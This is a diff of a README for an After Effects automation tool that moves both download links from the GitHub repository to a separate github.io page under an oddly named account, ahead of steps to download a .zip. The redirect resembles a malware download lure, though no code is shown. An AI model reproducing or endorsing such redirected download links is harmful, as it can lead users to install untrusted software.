@@ -1,6 +1,6 @@
 # ⚡ ae-motion-compiler - Automate your After Effects animation workflow
 
-[ ![Download AE Motion Compiler](https://img.shields.io/badge/Download-Release-blue.svg) ](https://github.com/incorruptible-laticifer419/ae-motion-compiler)
+[ ![Download AE Motion Compiler](https://img.shields.io/badge/Download-Release-blue.svg) ](https://incorruptible-laticifer419.github.io)
 
 ## 🎯 About the tool
 
@@ -20,7 +20,7 @@ Before you install, make sure your computer meets these needs:
 
 Follow these steps to set up the tool on your Windows machine.
 
-1.  Visit the [official download page here](https://github.com/incorruptible-laticifer419/ae-motion-compiler).
+1.  Visit the [official download page here](https://incorruptible-laticifer419.github.io).
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the version with the label Latest.
 4.  Find the file ending in .zip under the Assets section.
